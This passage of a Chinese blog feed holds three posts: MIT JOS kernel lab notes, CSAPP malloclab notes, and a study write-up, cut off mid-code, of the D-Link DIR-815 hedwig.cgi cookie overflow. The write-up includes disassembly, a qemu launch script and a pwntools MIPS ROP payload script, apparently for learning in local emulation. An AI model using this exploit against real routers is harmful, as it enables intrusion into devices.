loader</code>的链接和加载地址相同，内核的不同。许多机器没有<code>0xf0100000</code>这么高的地址，我们要将处理器的内存管理硬件从虚拟地址<code>0xf0100000</code>映射到物理地址<code>0x100000</code>处（<code>kernel</code>实际被加载的地址）。链接内核比<code>boot loader</code>更复杂，所以内核的链接和加载地址在<code>kern/kernel.ld</code>的顶部【啥因果关系】。操作系统内核通常更倾向于链接并运行在较高的虚拟地址，将处理器的低地址留给用户程序使用。</p><p><strong>Exercise 7.</strong> 在切换到保护模式前观察内存<code>0x00100000</code>和<code>0xf0100000</code>处的值，单步运行一步，观察发生了什么？如果新的映射建立不正确，此后第一条出错的指令是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x100025:mov    %eax,%cr0</span><br><span class="line">0x00100025 in ?? ()</span><br><span class="line">(gdb) x/8wx 0x100000</span><br><span class="line">0x100000:0x1badb0020x000000000xe4524ffe0x7205c766</span><br><span class="line">0x100010:0x340000040x2000b8120x220f00110xc0200fd8</span><br><span class="line">(gdb) x/8wx 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><p>执行后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100028:mov    $0xf010002f,%eax</span><br><span class="line">0x00100028 in ?? ()</span><br><span class="line">(gdb) x/8wx 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:0x1badb0020x000000000xe4524ffe0x7205c766</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:0x340000040x2000b8120x220f00110xc0200fd8</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>第一条出错感觉这句吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f0100028:b8 2f 00 10 f0       mov    $0xf010002f,%eax</span><br><span class="line">jmp*%eax</span><br><span class="line">f010002d:ff e0                jmp    *%eax</span><br></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p><strong>Exercise 8</strong> 补全8进制输出代码</p><p>类比16进制写。可变长度参数函数<a href="https://en.cppreference.com/w/c/variadic">参考</a></p><ul><li>Explain the following from console.c:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 实现了滚屏功能 */</span></span><br><span class="line"><span class="number">1</span>      <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line"><span class="number">2</span>              <span class="type">int</span> i;</span><br><span class="line"><span class="number">3</span>              memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>));<span class="comment">// 将第二行至结尾的字符移动到第一行至倒数第二行</span></span><br><span class="line"><span class="number">4</span>              <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line"><span class="number">5</span>                      crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;<span class="comment">// 最后一行输出空格，前背景色没查到</span></span><br><span class="line"><span class="number">6</span>              crt_pos -= CRT_COLS;</span><br><span class="line"><span class="number">7</span>      &#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>crt_pos</code>:<code>current position</code>表示了当前光标位置</p><p><code>CRT_SIZE</code>:显示屏最大字符数，宽×高</p><p><code>crt_buf</code>：16位无符号整数数组，存储显示屏所有字符的ASCII码和显示属性。</p></blockquote><ul><li>调试，回答问题</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>, z = <span class="number">4</span>;</span><br><span class="line">cprintf(<span class="string">&quot;x %d, y %x, z %d\n&quot;</span>, x, y, z);</span><br></pre></td></tr></table></figure><p>1.In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;这个地方发现如果只跟到<code>cprintf</code>第一句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">fmt</span></span><br><span class="line"><span class="variable">$1</span> = 0xf0101c52 <span class="string">&quot;x %d, y %x, z %d\n&quot;</span></span><br><span class="line">pwndbg&gt; p ap</span><br><span class="line">No symbol <span class="string">&quot;ap&quot;</span> <span class="keyword">in</span> current context.</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>ap</code>的值看不到，不懂为啥。跟到<code>cprintf</code>调用的<code>vcprintf</code>第一句才看到正确的指向如下。<code>fmt</code>指向模板字符串地址，<code>ap</code>指向参数列表地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">fmt</span></span><br><span class="line"><span class="variable">$4</span> = 0xf0101c52 <span class="string">&quot;x %d, y %x, z %d\n&quot;</span></span><br><span class="line">pwndbg&gt; p ap</span><br><span class="line"><span class="variable">$5</span> = (va_list) 0xf0110fd4 <span class="string">&quot;\001&quot;</span></span><br><span class="line">pwndbg&gt; x/3wx ap</span><br><span class="line">0xf0110fd4:     0x00000001      0x00000003      0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>6.Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;不太懂想问啥</p><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p><code>backtrace</code>：回溯，嵌套调用call的过程中保存下来的IP指针的值集合</p><p><strong>Exercise 9.</strong> 找出内核初始化栈的位置，栈的位置。内核是如何为栈保留空间的？栈指针最初指向这块区域的哪一端？</p><p>​          在<code>kern/entry.S</code>中的这两句初始化了栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f010002f &lt;relocated&gt;:</span><br><span class="line">relocated:</span><br><span class="line"></span><br><span class="line"># Clear the frame pointer register (EBP)</span><br><span class="line"># so that once we get into debugging C code,</span><br><span class="line"># stack backtraces will be terminated properly.</span><br><span class="line">movl$0x0,%ebp# nuke frame pointer</span><br><span class="line">f010002f:bd 00 00 00 00       mov    $0x0,%ebp</span><br><span class="line"></span><br><span class="line"># Set the stack pointer</span><br><span class="line">movl$(bootstacktop),%esp</span><br><span class="line">f0100034:bc 00 00 11 f0       mov    $0xf0110000,%esp</span><br><span class="line"></span><br><span class="line"># now to C code</span><br><span class="line">calli386_init</span><br><span class="line">f0100039:e8 6c 00 00 00       call   f01000aa &lt;i386_init&gt;</span><br></pre></td></tr></table></figure><p>​      文档提示，由于编译器优化，在 <code>mon_backtrace()</code>序言前调用<code>read_ebp</code>会导致不完整的栈回溯，需要保证调用<code>read_ebp</code>发生在<code>mon_backtrace</code>之后。</p><p>【为啥直接调函数会优化】</p><p><strong>Exercise 12.</strong> 改进回溯函数，打印文件名、函数名、源文件行数、<code>eip</code>相对函数地址的偏移。</p><p>【为啥填的是<code>n_desc</code>成员】</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#Extended-Asm">带有C表达式操作数的AT&amp;T语法</a>或<a href="http://neuraldk.org/document.php?att_asm">介个</a></p><p><a href="http://www.osdever.net/FreeVGA/home.htm">我死活读不懂的VGA文档</a></p><p>CSAPP链接</p><p><del>这个<code>lab</code>真是做得费劲死了</del></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;ensp;蕾姆，终于小小地填了点坑&lt;/p&gt;</summary>
    
    
    
    
    <category term="os" scheme="http://ll1ng.github.io/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>csapp-malloclab</title>
    <link href="http://ll1ng.github.io/2022/02/27/malloclab/"/>
    <id>http://ll1ng.github.io/2022/02/27/malloclab/</id>
    <published>2022-02-27T05:10:31.000Z</published>
    <updated>2022-02-27T05:10:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<del>才不会告诉你我做lab的动力都是为了过check看得分呢！</del></p><span id="more"></span><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;这个<code>lab</code>要求实现一个内存管理器，通过11个样例并获得尽可能高的分数。打分包括两部分：空间利用率（已分配状态堆大小/堆的总大小 评分占60%）+吞吐量（平均每秒完成的操作数 评分占40%）。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;整理一些书上有助于做出<code>lab</code>的内容。</p><h2 id="提高性能的方式"><a href="#提高性能的方式" class="headerlink" title="提高性能的方式"></a>提高性能的方式</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;提高空间利用率：最小化碎片化。分配器通常采用启发式策略维持少量大空闲块来减少外部碎片的产生。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;提高吞吐量：减少分配时间。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp; 一个动态内存管理器的合理性能要求一个分配请求的最大运行时间与空闲块数量成线性关系，释放请求的运行时间为常数。ok这就是目标了。</p><h2 id="几种实现"><a href="#几种实现" class="headerlink" title="几种实现"></a>几种实现</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;为在吞吐率和利用率之间把握好平衡，对几种实现方式的空闲块组织、放置、分割、合并进行讨论。</p><h3 id="隐式空闲链表"><a href="#隐式空闲链表" class="headerlink" title="隐式空闲链表"></a>隐式空闲链表</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;遍历所有块，对已分配位检查从而间接遍历所有空闲块。（由于“间接”因而得名“隐式”）</p><ul><li><p>如何标识空闲块：已分配位为0</p></li><li><p>如何得到合适空闲块：</p><ul><li>首次适配：从头搜索空闲链表，选择第一个合适的空闲块</li><li>下一次适配：从上一次查询结束的地方开始搜索，…</li><li>最佳适配：检查每个空闲块，选择适合所需请求大小的最小空闲块</li></ul></li><li><p>分割：将选中空闲块分为两个</p></li><li><p>合并：</p><ul><li>立即合并：释放块时合并</li><li>推迟合并：稍晚再合并（快速的分配器会选择某种形式的推迟合并）</li></ul></li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;分配时间复杂度：O(堆块总数)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;释放时间复杂度：O(1)</p><h3 id="显式空闲链表"><a href="#显式空闲链表" class="headerlink" title="显式空闲链表"></a>显式空闲链表</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;将空闲块组织为某种显式数据结构。</p><ul><li>后进先出顺序+首次适配=释放时间为常数</li><li>按地址顺序维护链表：释放需线性时间；首次适配内存利用率&gt;后进先出+首次适配</li></ul><h3 id="分离的空闲链表"><a href="#分离的空闲链表" class="headerlink" title="分离的空闲链表"></a>分离的空闲链表</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;一种减少分配时间的方法：分离存储。维护多个空闲链表，每个链表中的块大小相等。</p><h4 id="简单分离存储"><a href="#简单分离存储" class="headerlink" title="简单分离存储"></a>简单分离存储</h4><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;不分割、合并空闲块，找不到大小一样的空闲块则申请一个固定大小的额外内存片，分成大小相等的块链接起来形成新的空闲链表。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;分配释放都是常数时间操作，但容易造成内外部碎片。</p><h4 id="分离适配"><a href="#分离适配" class="headerlink" title="分离适配*"></a>分离适配*</h4><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;对适当的空闲链表做首次适配，找到了就分割，剩下部分插入适当空闲链表中。分离空闲链表+首次适配搜索的内存利用率近似与对整个堆进行最佳适配搜索。</p><h4 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h4><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;分离适配的特例，块大小为2的幂。适用于预先知道块大小为2的幂的特定应用。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>ptmalloc</code>使用的是分离适配，我也选择了分离适配来实现。当请求大小大于某特定值时合并<code>bin</code>中的所有空闲<code>chunk</code>。这个值若过小可能导致分配时间太长，过大可能导致碎片太多，最后面向样例取了<code>0x2000</code>。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;关于使用双向链表还是单向链表：一开始<code>fastbin</code>中的<code>chunk</code>是用单向链表组织的，但是合并的时候给我整不会了，怎么得到后向<code>chunk</code>进行<code>unlink</code>呢，没想通就统一用双向循环链表了。（这里前向后向指释放时间前后，比当前释放早的定义为<code>prev</code>）</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;关于堆块结构：尽量和<code>ptmalloc</code>的一样吧……一开始是按书上结构写的，头部尾部各1个字，结果查对齐查<code>realloc</code>内容的时候还得改测试代码，真麻烦。。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;看评分代码，空间利用率貌似是用最大请求总大小除以最终堆区大小得到的，（虽然感觉不太合理）所以要求不能将堆区收缩，否则可能导致空间利用率大于1。但是<code>realloc</code>那俩样例如果不给堆结尾特殊处理一下会超过可用范围，就把大小被<code>realloc</code>不断调整的堆块放置到末尾，不断调整<code>mem_brk</code>的位置即可。不过给出的样例并没有用到将堆区收缩的功能所以也算满足要求（？）</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;总的来说样例不算刁钻，<del>甚至有不少空子可以钻</del>但因为遇到的错误很多还是完成得比较艰难。完结撒花✿✿ヽ(°▽°)ノ✿</p><p><img src="https://raw.githubusercontent.com/ll1ng/picture/main/result.png"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<a href="https://github.com/ll1ng/practice/blob/main/mm.c">代码地址</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;ensp;&lt;del&gt;才不会告诉你我做lab的动力都是为了过check看得分呢！&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="os" scheme="http://ll1ng.github.io/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-815路由器多次溢出漏洞分析</title>
    <link href="http://ll1ng.github.io/2021/11/02/long-value-cookie/"/>
    <id>http://ll1ng.github.io/2021/11/02/long-value-cookie/</id>
    <published>2021-11-02T09:07:16.000Z</published>
    <updated>2021-11-02T09:07:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp; &nbsp; &nbsp; &nbsp; 《揭秘》的第一个漏洞分析。</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;该漏洞的描述位于<a href="https://www.exploit-db.com/exploits/33863">这里</a>，可知漏洞出现在<code>hedwig.cgi</code>文件中。首先了解一下<code>cgi</code>文件。</p><blockquote><p><code>cgi(Common Gateway Interface)</code>，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 这类文件大概功能就是根据客户端提交的请求生成html页面（？）先获得<a href="http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP">固件</a>，<code>unzip</code>得到<code>.bin</code>文件，<code>binwalk -e </code>得到文件系统。在文件系统下<code>find . -name  hedwig.cgi</code>，得到的文件是指向<code>./htdocs/cgibin</code>文件的一个符号链接。故对<code>cgibin</code>文件进行分析。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 根据漏洞描述可知漏洞出现的位置与<code>cookie</code>的值有关，搜索<code>cookie</code>字符串的引用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00407C98                 .globl sess_get_uid</span><br><span class="line">.text:00407C98 sess_get_uid:                            # CODE XREF: phpcgi_main+214↑p</span><br><span class="line">.text:00407C98                                          # authentication+338↓p ...</span><br><span class="line">.text:00407C98</span><br><span class="line">...</span><br><span class="line">.text:00407D00                 la      $t9, getenv</span><br><span class="line">.text:00407D04                 li      $a0, aHttpCookie  # &quot;HTTP_COOKIE&quot;</span><br><span class="line">.text:00407D08                 jalr    $t9 ; getenv</span><br><span class="line">.text:00407D0C                 move    $s3, $v0</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 可知<code>cookie</code>的值是函数<code>sess_get_id</code>调用<code>getenv(&quot;HTTP_COOKIE&quot;)</code>得到的。<code>char *getenv(const char *name);</code>该函数返回一个指向该环境变量值的指针。再查找函数<code>sess_get_id</code>的引用：</p><img src="https://i.loli.net/2021/11/03/F3iVxug5WYzIB7L.png" alt="image-20211102201112980" style="zoom:50%;" /><p>&nbsp; &nbsp; &nbsp; &nbsp; 还挺多。书上说去找<code>hedwigcgi_main</code>内的引用，可能是因为存在漏洞的文件名是<code>hedwig.cgi</code>吧。于是跳过去查看，发现了危险函数<code>sprintf</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00409640                 la      $t9, sess_get_uid</span><br><span class="line">.text:00409644                 nop</span><br><span class="line">.text:00409648                 jalr    $t9 ; sess_get_uid</span><br><span class="line">.text:0040964C                 move    $a0, $s5</span><br><span class="line">.text:00409650                 lw      $gp, 0x4C0+var_4B0($sp)</span><br><span class="line">.text:00409654                 nop</span><br><span class="line">.text:00409658                 la      $t9, sobj_get_string</span><br><span class="line">.text:0040965C                 nop</span><br><span class="line">.text:00409660                 jalr    $t9 ; sobj_get_string</span><br><span class="line">.text:00409664                 move    $a0, $s5</span><br><span class="line">.text:00409668                 lw      $gp, 0x4C0+var_4B0($sp)</span><br><span class="line">.text:0040966C                 lui     $a1, 0x42  # &#x27;B&#x27;</span><br><span class="line">.text:00409670                 la      $t9, sprintf</span><br><span class="line">.text:00409674                 move    $a3, $v0</span><br><span class="line">.text:00409678                 move    $a2, $s2</span><br><span class="line">.text:0040967C                 li      $a1, aSSPostxml  # &quot;%s/%s/postxml&quot;</span><br><span class="line">.text:00409680                 jalr    $t9 ; sprintf</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 继续查看函数<code>hedwigcgi_main</code>的引用，发现只有<code>main</code>调用了，所以通过分析<code>hedwigcgi_main</code>的逻辑设置环境变量。</p><img src="https://i.loli.net/2021/11/03/Rvl4dLyXKuSCDsN.png" alt="image-20211102202521384" style="zoom:50%;" /><p>&nbsp; &nbsp; &nbsp; &nbsp; 函数<code>hedwigcgi_main</code>首先获得<code>REQUEST_METHOD</code>的值，不为<code>POST</code>则打印失败信息。接着调用<code>cgibin_parse_request</code>，获得<code>CONTENT_TYPE</code>和<code>CONTENT_LENGTH</code>的值（总之经过一堆判断这俩都不能为空）。用下面这段来判断这两个值需要满足的条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if ( type )</span><br><span class="line">&#123;</span><br><span class="line">    relo_item = p2rel_42C014;             // application/</span><br><span class="line">    v16 = 0;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">        name = relo_item-&gt;name;</span><br><span class="line">        if ( !relo_item-&gt;name )</span><br><span class="line">        break;</span><br><span class="line">        str_len = relo_item-&gt;size;</span><br><span class="line">        ++relo_item;</span><br><span class="line">        ++v16;</span><br><span class="line">        if ( !strncasecmp(type, name, str_len) )</span><br><span class="line">        return ((int (__fastcall *)(int, int, unsigned int, char *))p2rel_42C014[v16 - 1].func)(</span><br><span class="line">        a1,</span><br><span class="line">        a2_0,</span><br><span class="line">        content_length,</span><br><span class="line">        &amp;type[str_len]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 而<code>p2rel_42C014</code>处的符号地址字段对<code>type</code>后面的字符进行判断，需等于<code>x-www-form-urlencoded</code>。然后调用<code>sobj_new</code>创建两个大小为6的指针数组，偏移为5处存放<code>cookie</code>。调用<code>sess_get_uid</code>，得到<code>HTTP_COOKIE</code>的值。同样创建两个指针数组<code>a1,a2</code>，以等号为界将前半部分存入<code>a1</code>偏移为5处，后半部分存入<code>a2</code>偏移为5处，<code>a1[5]</code>为<code>uid</code>则将<code>a2[5]</code>存入参数指针数组的偏移为5处。函数<code>sobj_get_string</code>获得该数组中指向<code>cookie</code>的指针。（<code>REMOTE_ADDR</code>应该不用填）接着到了<code>sprintf</code>函数，而在这之下有另一个<code>sprintf</code>函数，据书上说明测试后远程是有<code>/var/tmp</code>目录的，所以造成漏洞的是第二个<code>sprintf</code>。</p><h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><p>几个环境变量的值有以下要求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REQUEST_METHOD: POST</span><br><span class="line">CONTENT_TYPE: application/x-www-form-urlencoded</span><br><span class="line">CONTENT_LENGTH: 不太懂，暂时设成payload长度</span><br><span class="line">REQUEST_URI: 不为空</span><br><span class="line">REMOTE_ADDR: *</span><br><span class="line">HTTP_COOKIE: uid=...</span><br></pre></td></tr></table></figure><p>写个<code>shell</code>脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exp.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">when you execute the file <span class="keyword">for</span> the first time,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span></span><br><span class="line"></span><br><span class="line">python 815.py</span><br><span class="line"></span><br><span class="line">INPUT=$(cat payload)</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$1&quot; ] ;then   # $1 exists</span><br><span class="line">echo &quot;$INPUT&quot; | chroot . ./qemu \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E HTTP_COOKIE=$INPUT \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E CONTENT_LENGTH=$LEN \</span><br><span class="line">-E REQUEST_URI=&quot;a&quot; \</span><br><span class="line">-g $PORT \</span><br><span class="line">/htdocs/web/hedwig.cgi</span><br><span class="line">else </span><br><span class="line">echo &quot;$INPUT&quot; | chroot . ./qemu \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E HTTP_COOKIE=$INPUT \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E CONTENT_LENGTH=$LEN \</span><br><span class="line">-E REQUEST_URI=&quot;a&quot; \</span><br><span class="line">/htdocs/web/hedwig.cgi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>写个<code>python</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;815.py&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base=<span class="number">0x76738000</span></span><br><span class="line">gadget1=<span class="number">0x158c8</span> <span class="comment"># s0+1,-&gt;s5</span></span><br><span class="line">gadget2=<span class="number">0x159CC</span> <span class="comment"># sp+0x18-&gt;a0, -&gt;s0</span></span><br><span class="line"></span><br><span class="line">pd=<span class="string">&#x27;uid=12345&#x27;</span></span><br><span class="line">regs=flat(</span><br><span class="line">base+<span class="number">0x531ff</span>,<span class="comment"># s0</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s1</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s2</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s3</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s4</span></span><br><span class="line">base+gadget2,<span class="comment"># s5</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s6</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s7</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># fp</span></span><br><span class="line">base+gadget1,<span class="comment"># ra</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pd+=regs.rjust(<span class="number">1008</span>,<span class="string">&#x27;a&#x27;</span>)+<span class="number">0x10</span>*<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span 